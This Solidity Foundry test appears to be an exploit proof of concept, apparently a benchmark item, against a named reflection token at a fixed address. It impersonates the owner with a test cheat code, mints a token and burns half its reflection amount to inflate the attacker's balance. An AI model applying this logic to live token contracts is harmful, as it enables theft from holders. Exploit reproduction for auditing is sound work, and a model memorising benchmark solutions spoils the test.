pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function burn(uint256 _value) external;
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns(uint256);
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6bf3a93793e52f75543c92AfEC4636559988e3c1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        vm.label(TARGET, "Crucifearous Token");

        // Get the current owner of the contract
        address owner = CoinToken(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial balance
        uint256 initialBalance = CoinToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Step 2: Impersonate the owner
        address owner = CoinToken(TARGET).owner();
        vm.startPrank(owner);

        // Step 3: Mint 1 token to attacker
        uint256 mintAmount = 1 * 10**CoinToken(TARGET).decimals();
        CoinToken(TARGET).mint(attacker, mintAmount);
        console.log("Minted", mintAmount, "tokens to attacker");

        // Step 4: Get reflection amount for 1 token
        uint256 reflectionForOneToken = CoinToken(TARGET).reflectionFromToken(mintAmount, false);
        console.log("Reflection amount for 1 token:", reflectionForOneToken);

        // Step 5: Burn half of the reflection amount
        uint256 burnAmount = reflectionForOneToken / 2;
        console.log("Burning", burnAmount, "reflection units");
        CoinToken(TARGET).burn(burnAmount);

        vm.stopPrank();

        // Step 6: Check final balance
        uint256 finalBalance = CoinToken(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Balance change:", finalBalance - initialBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

